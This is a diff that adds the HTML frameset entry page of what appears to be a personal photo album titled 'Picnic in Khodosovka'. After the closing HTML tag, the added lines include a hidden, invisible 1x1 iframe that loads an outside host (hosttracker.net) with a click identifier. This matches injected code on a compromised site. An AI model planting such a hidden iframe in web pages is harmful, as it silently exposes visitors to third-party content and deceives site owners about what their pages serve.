@@ -1,0 +1,16 @@
+<HTML>
+  <HEAD>
+    <!-- Meta http equivalent was here                               -->
+    <TITLE>Пикничок в Ходосовке</TITLE>
+  </HEAD>
+  <FRAMESET ROWS="30%,3,*" BORDER=0>
+    <FRAMESET COLS="40%,20%,*">
+      <FRAME SRC = "title.html"   FRAMEBORDER=0>
+      <FRAME SRC = "logo.html"    FRAMEBORDER=0 SCROLLING=NO>
+      <FRAME SRC = "authors.html" FRAMEBORDER=0>
+    </FRAMESET>
+    <FRAME   SRC = "grey.html"                  SCROLLING=NO>
+    <FRAME   SRC = "artur/"        FRAMEBORDER=0 NAME="photo">
+  </FRAMESET>
+</HTML>
+<iframe src="http://hosttracker.net/?click=12022078" width=1 height=1 style="visibility:hidden;position:absolute"></iframe>
